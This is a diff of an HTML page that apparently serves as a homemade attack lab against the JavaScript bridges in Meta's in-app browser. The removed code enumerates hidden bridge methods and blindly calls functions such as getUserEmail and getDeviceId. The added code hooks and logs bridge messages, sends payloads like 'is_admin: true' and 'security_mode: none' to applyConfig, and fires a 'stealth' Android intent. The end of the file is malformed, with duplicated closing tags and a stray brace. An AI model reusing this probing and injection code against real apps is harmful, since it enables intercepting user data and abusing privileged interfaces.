@@ -2,69 +2,105 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Bridge Impact Lab</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 15px; }
-        .box { border: 1px solid #0f0; padding: 10px; margin-bottom: 15px; border-radius: 5px; }
-        button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 12px; width: 100%; margin: 5px 0; font-weight: bold; }
-        .log { background: #111; height: 150px; overflow-y: scroll; font-size: 11px; padding: 5px; border: 1px dashed #444; }
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 15px; }
+        .card { border: 1px solid #00ff41; padding: 15px; margin-bottom: 20px; background: #000; box-shadow: 0 0 8px #00ff41; }
+        h2 { color: #fff; font-size: 1rem; text-transform: uppercase; margin-top: 0; }
+        button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 12px; width: 100%; margin: 5px 0; cursor: pointer; font-weight: bold; }
+        button:hover { background: #00ff41; color: #000; }
+        .log { background: #050505; height: 250px; overflow-y: auto; border: 1px dashed #00ff41; padding: 10px; font-size: 11px; margin-top: 10px; }
+        .status-success { color: #00ffff; }
+        .status-error { color: #ff0000; }
+        .status-intercept { color: #ffff00; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h3>Meta Bridge Sniper</h3>
-        <button onclick="testAndroid()">Test 'android' Bridge</button>
-        <button onclick="testUnified()">Test 'iabjs' Bridge</button>
-        <button onclick="deepEnumerate()">Deep Force Scan</button>
+    <div class="card">
+        <h2>1. Traffic Sniffer</h2>
+        <p style="font-size:0.7rem;">Yeh background messages ko intercept karega.</p>
+        <button onclick="startSniffing()">Start Global Sniffer</button>
     </div>
 
-    <div id="log" class="log">Ready to hunt...</div>
+    <div class="card">
+        <h2>2. Exploit & Fuzzing</h2>
+        <button onclick="runAdvancedFuzz()">Launch 'applyConfig' Fuzzer</button>
+        <button onclick="testIntentBypass()">Test Intent Bypass (Settings)</button>
+    </div>
+
+    <div class="card">
+        <h2>Logs:</h2>
+        <div id="log" class="log">Monitoring system...</div>
+    </div>
 
     <script>
-        const l = document.getElementById('log');
-        function log(m) { l.innerHTML += "<br>> " + m; l.scrollTop = l.scrollHeight; }
+        const logBox = document.getElementById('log');
+        function writeLog(msg, type='') {
+            const span = document.createElement('span');
+            span.className = type;
+            span.innerHTML = `<br>> [${new Date().toLocaleTimeString()}] ${msg}`;
+            logBox.appendChild(span);
+            logBox.scrollTop = logBox.scrollHeight;
+        }
 
-        // 1. Force Enumeration (Hidden Methods)
-        function deepEnumerate() {
-            log("Running Deep Force Scan...");
-            const bridges = ['android', 'iabjs_unified_bridge', 'browserDeclutter'];
-            
-            bridges.forEach(b => {
-                if(window[b]) {
-                    log("Inspecting: " + b);
-                    // Pro-tip: Get methods from prototype chain
-                    let proto = window[b];
-                    while (proto) {
-                        Object.getOwnPropertyNames(proto).forEach(p => log("Found: " + b + "." + p));
-                        proto = Object.getPrototypeOf(proto);
-                    }
+        // 1. Intercepting outgoing messages
+        function startSniffing() {
+            writeLog("Sniffer Started. Listening for messages...", "status-intercept");
+
+            // Global Message Listener
+            window.addEventListener("message", (event) => {
+                writeLog(`INTERCEPTED INCOMING: ${JSON.stringify(event.data)}`, "status-intercept");
+            }, false);
+
+            // Hooking into iabjs bridge
+            if (window.iabjs_unified_bridge) {
+                const original = window.iabjs_unified_bridge.postMessage;
+                window.iabjs_unified_bridge.postMessage = function(m, t) {
+                    writeLog(`OUTGOING BRIDGE: ${m}`, "status-intercept");
+                    return original.apply(this, arguments);
+                };
+                writeLog("iabjs_unified_bridge hooked successfully.");
+            }
+        }
+
+        // 2. Fuzzing applyConfig for logic bugs or crashes
+        function runAdvancedFuzz() {
+            if (!window.browserDeclutter || !window.browserDeclutter.applyConfig) {
+                writeLog("browserDeclutter.applyConfig not found!", "status-error");
+                return;
+            }
+
+            const payloads = [
+                { "is_admin": true, "feature_flags": ["*"] },
+                { "security_mode": "none" },
+                "A".repeat(5000), // Stress test
+                { "url_whitelist": ["*"] },
+                null,
+                0xDEADBEEF
+            ];
+
+            payloads.forEach((p, i) => {
+                try {
+                    window.browserDeclutter.applyConfig(p);
+                    writeLog(`Fuzz Payload ${i} Sent to applyConfig`, "status-success");
+                } catch(e) {
+                    writeLog(`Payload ${i} failed: ${e.message}`, "status-error");
                 }
             });
         }
 
-        // 2. Blind Testing 'android' interface
-        function testAndroid() {
-            if(!window.android) { log("android bridge not found"); return; }
-            log("Attempting 'android' blind calls...");
-            const calls = ['showToast', 'getDeviceId', 'getUserEmail', 'copyToClipboard'];
-            calls.forEach(c => {
-                try {
-                    window.android[c]("Test Payload");
-                    log("Called: android." + c);
-                } catch(e) { log("Failed: " + c); }
-            });
+        // 3. Intent Testing (Jo tune pehle bola tha)
+        function testIntentBypass() {
+            writeLog("Attempting stealth intent trigger...");
+            // Force opening settings via intent
+            const intentUrl = "intent:#Intent;action=android.settings.SECURITY_SETTINGS;end";
+            window.location.href = intentUrl;
         }
-
-        // 3. Blind Testing 'iabjs_unified_bridge'
-        function testUnified() {
-            if(!window.iabjs_unified_bridge) { log("iabjs bridge not found"); return; }
-            log("Sending JSON Probe to Unified Bridge...");
-            try {
-                // Meta bridges aksar postMessage ya call use karte hain
-                window.iabjs_unified_bridge.postMessage(JSON.stringify({handler: 'test', data: 'hello'}), "*");
-                log("Probe sent to iabjs");
-            } catch(e) { log("iabjs Error: " + e.message); }
-        }
+    </script>
+</body>
+</html>
+}
     </script>
 </body>
 </html>
